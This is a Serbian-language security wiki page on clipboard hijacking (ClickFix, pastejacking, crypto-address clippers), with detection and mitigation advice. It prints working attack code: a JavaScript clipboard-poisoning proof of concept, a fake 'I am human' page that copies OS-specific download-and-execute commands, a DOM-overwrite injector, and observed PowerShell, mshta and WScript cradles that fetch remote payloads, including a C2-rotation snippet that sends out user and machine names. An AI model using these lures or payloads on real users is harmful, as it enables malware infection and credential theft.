# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> „Nikada ne lepite ništa što sami niste kopirali.“ – stari, ali i dalje važeći savet

## Pregled

Clipboard hijacking – poznat i kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i nalepljuju komande, a da ih prethodno ne pregledaju. Zlonamerna veb-stranica (ili bilo koji kontekst koji podržava JavaScript, kao što su Electron ili Desktop aplikacije) programski postavlja tekst koji kontroliše napadač u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim uputstvima za socijalni inženjering, da pritisnu **Win + R** (dijalog Run), **Win + X** (Quick Access / PowerShell) ili otvore terminal i *nalepe* sadržaj clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto se **nijedna datoteka ne preuzima i nijedan prilog ne otvara**, ova tehnika zaobilazi većinu bezbednosnih kontrola za e-poštu i veb-sadržaj koje nadgledaju priloge, makroe ili direktno izvršavanje komandi. Zbog toga je ova tehnika popularna u phishing kampanjama koje isporučuju uobičajene porodice malware-a kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper-i za zamenu adresa novčanika

Druga varijanta **clipboard hijacking-a** uopšte ne lepi komande: čeka da žrtva kopira **adresu cryptocurrency novčanika**, a zatim je neprimetno zameni adresom koju kontroliše napadač, neposredno pre lepljenja. Ovo je naročito efikasno kod dugih formata adresa novčanika jer korisnici često proveravaju samo početne i završne znakove.<sup>[[8]](#references)</sup>

Uobičajene karakteristike iz stvarnog sveta:
- **Tanak loader + ugnježdeni payload**: vidljiva aplikacija/exe izgleda kao legitimni alat za trgovanje ili „profit“, dok je pravi clipper skriven dublje u paketu (na primer, .NET loader pokreće ugnježdeni Rust payload).
- **Zamena zasnovana na regex-u**: malware prepoznaje stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ili čak generičke stringove **dužine 44 znaka nalik Solana adresama** i menja ih u adrese novčanika napadača.
- **Rotacija adresa novčanika u velikom obimu**: savremeni Windows primerci mogu da sadrže **hiljade** zamenskih adresa novčanika za svaku valutu, umesto jedne statične adrese, čime se smanjuje narušavanje reputacije adrese nakon svake krađe.<sup>[[8]](#references)</sup>

### Tok rada Windows clipper-a

Česta implementacija koristi skriveni prozor registrovan pomoću **`AddClipboardFormatListener`**. Pri svakom ažuriranju clipboard-a, malware obično poziva:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → pristupa trenutnim podacima clipboard-a.
- **`GetClipboardData`** → čita tekst.
- **`EmptyClipboard`** + **`SetClipboardData`** → zamenjuje string adrese novčanika vrednošću napadača.

Minimalni regex-i za hunting koji se često sreću u clipper-ima:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

User-level persistence je dovoljna da ostvari uticaj. Jedan zabeleženi obrazac je:<sup>[[8]](#references)</sup>
- Kopiranje payload-a u **`%APPDATA%\silke\silke.exe`**
- Kreiranje **Startup-folder LNK** fajla u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detekciju:
- Procesi koji neprekidno pozivaju clipboard API-je, a istovremeno upisuju fajlove u `%APPDATA%` i korisnički **Startup** folder.
- Kreiranje novog LNK/executable fajla, nakon čega slede izmene wallet adresa u clipboard-u.
- Arhive ili paketi lažnog softvera koji sadrže mnogo nekorišćenih fajlova, kao i mali launcher koji pokreće ugnježdeni binary.

### Društvenim inženjeringom iznuđeno uklanjanje quarantine-a na macOS-u + LaunchAgent persistence

Na macOS-u, neke kampanje isporučuju pomoćni fajl **`unlocker.command`** i daju žrtvi uputstvo da klikne desnim tasterom miša → **Open** ako Gatekeeper prijavi da je aplikacija oštećena ili potiče od neidentifikovanog developera. Skripta samo uklanja quarantine i pokreće obližnji `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Ovo **nije** Gatekeeper exploit; reč je o **zaobilaženju quarantine-a putem socijalnog inženjeringa** koje zloupotrebljava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr-a.<sup>[[8]](#references)</sup>

Nakon izvršavanja, clipper može da se održi kao trenutni korisnik upisivanjem:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper skripta
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`

Korisno je znati da neki uzorci koriste **watchdog koji sam sebe obnavlja** i ponovo upisuje LaunchAgent i wrapper na svakih ~30 sekundi. Ako prvo uklonite plist, **a ne ugasite pokrenuti proces**, malware može odmah ponovo da ga napravi.<sup>[[8]](#references)</sup> Bezbedan redosled čišćenja:
1. Ugasite aktivni clipper proces.
2. Unload-ujte/obrišite LaunchAgent plist.
3. Obrišite `~/launch.sh` i kopirani payload.

### Napomena o isporuci: lažna reputacija kao pojačivač

Kod ove porodice, sam malware može ostati tehnički jednostavan, dok **sloj distribucije** obavlja glavni posao: lažni GitHub stars/forks, SourceForge recenzije/preuzimanja, YouTube komentari/pregledi tutorijala i naizgled bezopasni VirusTotal komentari/glasovi koriste se da bi binarna datoteka delovala pouzdano pre izvršavanja.<sup>[[8]](#references)</sup>

## Nametnuta dugmad za kopiranje i skriveni payload-i (macOS one-liners)

Neki macOS infostealers kloniraju instalacione sajtove (npr. Homebrew) i **primoravaju korisnike da koriste dugme „Copy“**, tako da ne mogu da označe samo vidljivi tekst. Sadržaj clipboard-a obuhvata očekivanu instalacionu komandu i dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), pa jedno lepljenje izvršava oba dela, dok UI skriva dodatnu fazu.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Starije kampanje su koristile `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Tok ClickFix / ClearFake

1. Korisnik posećuje sajt sa typosquattingom ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Ubrizgani **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()` koja neprimetno čuva Base64-kodiranu PowerShell jednolinijsku komandu u clipboardu.
3. HTML uputstva govore žrtvi: *„Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.“*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitimnu izvršnu datoteku i zlonamerni DLL (klasični DLL sideloading).
5. Loader dešifruje dodatne faze, ubacuje shellcode i uspostavlja persistence (npr. zakazani zadatak) – što na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Primer lanca NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum u potrazi za `msvcp140.dll`.
* Zlonamerni DLL dinamički razrešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih pomoću rolling XOR ključa `"https://google.com/"`, ubacuje završni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Preuzima `la.txt` pomoću **curl.exe**
2. Pokreće JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer preko MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Poziv **mshta** pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i konkatenacije fajlova, a zatim pokreće `.a3x` skript koji eksfiltrira akreditive pregledača na `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanje fajlova i umesto toga navode žrtve da nalepe jednolinijsku komandu koja preuzima i izvršava JavaScript preko WSH-a, obezbeđuje njegovu postojanost i svakodnevno menja C2. Primer uočene sekvence:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Ključne osobine
- Obfuskirani URL se obrće tokom izvršavanja kako bi se izbegla površna provera.
- JavaScript obezbeđuje svoju perzistenciju putem Startup LNK-a (WScript/CScript) i bira C2 prema trenutnom danu – što omogućava brzu rotaciju domena.<sup>[[3]](#references)</sup>

Minimalni JS fragment koji rotira C2-ove prema datumu:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Sledeća faza obično postavlja loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često vezujući TLS za hardkodovani sertifikat i segmentirajući saobraćaj.<sup>[[3]](#references)</sup>

Ideje za detekciju specifične za ovu varijantu
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Artefakti pri pokretanju: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji pokreće WScript/CScript sa JS putanjom u `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetrija komandne linije koji sadrže `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponavljani `powershell -NoProfile -NonInteractive -Command -` sa velikim payload-ima preko stdin-a, za prosleđivanje dugih skripti bez dugačkih komandnih linija.
- Scheduled Tasks koji zatim pokreću LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` u okviru zadatka/putanje koja izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).

Lov na pretnje
- C2 hostname-ovi koji se rotiraju svakodnevno i URL-ovi u obliku `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Povežite događaje upisa u međuspremnik sa naknadnim nalepljivanjem preko Win+R, a zatim neposrednim pokretanjem `powershell.exe`.

Blue team-ovi mogu da kombinuju telemetriju međuspremnika, kreiranja procesa i Registry-ja kako bi precizno otkrili zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju komandi **Win + R** – potražite neuobičajene Base64 / obfuskirane unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe`, a `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje fajlova u `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenim fasciklama neposredno pre sumnjivog događaja 4688.
* EDR senzori međuspremnika (ako postoje) – povežite `Clipboard Write` sa neposrednim pokretanjem novog PowerShell procesa.

## IUAM-stranice za verifikaciju (ClickFix Generator): kopiranje iz međuspremnika u konzolu + payload-i prilagođeni OS-u

Nedavne kampanje masovno proizvode lažne stranice za verifikaciju CDN-a/pregledača („Just a moment…“, u IUAM stilu) koje navode korisnike da kopiraju komande specifične za OS iz međuspremnika u izvorne konzole. Time se izvršavanje premešta izvan browser sandbox-a, a pristup funkcioniše i na Windows-u i na macOS-u.<sup>[[4]](#references)</sup>

Ključne karakteristike stranica generisanih builder-om
- Detekcija OS-a pomoću `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD naspram macOS Terminal-a). Opcionalni mamci/no-op radnje za nepodržane OS-ove održavaju iluziju.
- Automatsko kopiranje u međuspremnik pri bezazlenim radnjama u UI-ju (checkbox/Copy), iako se vidljivi tekst može razlikovati od sadržaja međuspremnika.
- Blokiranje mobilnih uređaja i popover sa uputstvima korak po korak: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcionalna obfuskacija i injector u jednoj datoteci koji zamenjuje DOM kompromitovanog sajta verifikacionim UI-jem stilizovanim pomoću Tailwind-a (nije potrebna registracija novog domena).<sup>[[4]](#references)</sup>

Primer: neslaganje sadržaja međuspremnika + grananje prilagođeno OS-u
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Postojanost početnog izvršavanja na macOS-u
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` da bi se izvršavanje nastavilo i nakon zatvaranja terminala, čime se smanjuju vidljivi tragovi.<sup>[[4]](#references)</sup>

Preuzimanje stranice direktno na kompromitovanim sajtovima
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ideje za detekciju i threat hunting specifične za IUAM mamce
- Web: Stranice koje povezuju Clipboard API sa widgetima za verifikaciju; nepodudaranje prikazanog teksta i sadržaja clipboarda; grananje prema `navigator.userAgent`; Tailwind + zamena sadržaja jedne stranice u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa pregledačem; batch/MSI instaleri pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm pokreće `bash`/`curl`/`base64 -d` sa `nohup`-om u blizini događaja u pregledaču; pozadinski poslovi nastavljaju da rade nakon zatvaranja terminala.
- Povežite istoriju `RunMRU` Win+R i upise u clipboard sa naknadnim pokretanjem konzolnih procesa.

Pogledajte i tehnike podrške

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evolucije lažnih CAPTCHA / ClickFix napada iz 2026. (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i ubacuje JavaScript učitavača koji povezuje spoljne hostove (Cloudflare Workers, GitHub/jsDelivr), pa čak i blockchain pozive „etherhiding“ (npr. POST zahteve ka API krajnjim tačkama Binance Smart Chain-a kao što je `bsc-testnet.drpc[.]org`) radi preuzimanja aktuelne logike mamca. Nedavni overlay-i u velikoj meri koriste lažne CAPTCHA provere koje upućuju korisnike da kopiraju i nalepe one-liner (T1204.004) umesto da bilo šta preuzimaju.<sup>[[6]](#references)</sup>
- Početno izvršavanje se sve češće prepušta potpisanim hostovima skripti/LOLBAS alatima. Lanci iz januara 2026. zamenili su raniju upotrebu `mshta` ugrađenom skriptom `SyncAppvPublishingServer.vbs`, pokrenutom putem `WScript.exe`, uz prosleđivanje argumenata nalik PowerShell-u, sa aliasima/zamenskim znakovima za preuzimanje udaljenog sadržaja:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` je potpisan i obično se koristi uz App-V; u kombinaciji sa `WScript.exe` i neuobičajenim argumentima (aliasi `gal`/`gcm`, cmdleti sa džoker znakovima, jsDelivr URL-ovi) postaje visokosignalna LOLBAS faza za ClearFake.<sup>[[6]](#references)</sup>
- U februaru 2026. payload-i lažnih CAPTCHA provera ponovo su prešli na čiste PowerShell skripte za preuzimanje. Dva primera koja su trenutno aktivna:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Prvi lanac je grabber koji izvršava `iex(irm ...)` u memoriji; drugi koristi `WinHttp.WinHttpRequest.5.1`, upisuje privremenu `.ps1` datoteku, a zatim je pokreće sa `-ep bypass` u skrivenom prozoru.<sup>[[6]](#references)</sup>

Saveti za detekciju i lov na ove varijante
- Poreklo procesa: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles odmah nakon upisa u clipboard/Win+R.
- Ključne reči u komandnoj liniji: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domene ili obrasci sirovih IP adresa `iex(irm ...)`.
- Mreža: odlazne veze ka CDN worker hostovima ili blockchain RPC krajnjim tačkama iz script hostova/PowerShell-a, ubrzo nakon pregledanja veba.
- Datoteke/registar: kreiranje privremene `.ps1` datoteke u `%TEMP%` i RunMRU unosi koji sadrže ove jednolinijske komande; blokirajte/upozoravajte na potpisane skripte koje koriste LOLBAS (WScript/cscript/mshta) i izvršavaju se sa spoljnim URL-ovima ili zamaskiranim aliasima.

## ClickFix tehnike iz juna 2026: telemetrija lepljenja, lažni komentari za verifikaciju i ulančavanje LOLBin-ova

Nedavna telemetrija kompanije Red Canary pokazuje da stabilan indikator **nije jedna tačno određena komanda**, već kombinacija **lepljenja i pokretanja uz pomoć korisnika**, **pouzdanih interpretera/LOLBins**, **zamaskiranih zastavica**, **daljinskog preuzimanja** i **neposrednog izvršavanja**.<sup>[[7]](#references)</sup>

### Uočljivi obrasci operatora

- **Telemetrija potvrde lepljenja**: neki payload-i pozivaju `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` pre prave faze. Time se potvrđuje interakcija korisnika, uz kratak i neupadljiv prozor.
- **Lažni komentari za verifikaciju**: jednolinijske PowerShell komande mogu dodati nizove poput `# Security check ✔️ I'm not a robot Verification ID: 138105`, tako da komanda i nakon lepljenja u Run / `cmd.exe` / istoriju PowerShell-a i dalje izgleda povezano sa CAPTCHA-om.
- **Dinamičko sastavljanje URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` izbegava statički URL u komandnoj liniji, ali i dalje preuzima i izvršava sadržaj u memoriji.
- **Prikriveno izvršavanje instalacionog programa**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` zloupotrebljava neobičnu upotrebu velikih i malih slova i znakove nalik Unicode-u u zastavicama kako bi zaobišlo krhke detekcije, a da i dalje liči na `msiexec.exe`.
- **Lanci LOLBin-ova sa escape znakom caret**: `cmd.exe` može da sakrije ključne reči pomoću escape znakova `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), pokrene ugnježdenu komandnu ljusku minimizovanu, sačuva sadržaj napadača sa bezazlenom ekstenzijom kao što je `.pdf`, a zatim ga izvrši pomoću `mshta`.<sup>[[7]](#references)</sup>
## Mere ublažavanja

1. Ojačavanje browser-a – onemogućite upis u clipboard (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevajte korisnički gest.
2. Podizanje svesti o bezbednosti – naučite korisnike da osetljive komande *ukucaju* ili da ih prvo nalepe u uređivač teksta.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih jednolinijskih komandi.
4. Mrežne kontrole – blokirajte odlazne zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezane tehnike

* **Otimanje Discord pozivnica** često zloupotrebljava isti ClickFix pristup nakon što namami korisnike na zlonamerni server:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Popravi klik: Sprečavanje ClickFix vektora napada](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Iza čiste zavese: Od RAT-a do builder-a do programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix fabrika: Prvo otkrivanje IUAM ClickFix generatora](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Obaveštajni uvidi: februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Obaveštajni uvidi: jun 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Od zvezdica do glasova: Lažna reputacija podstiče crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
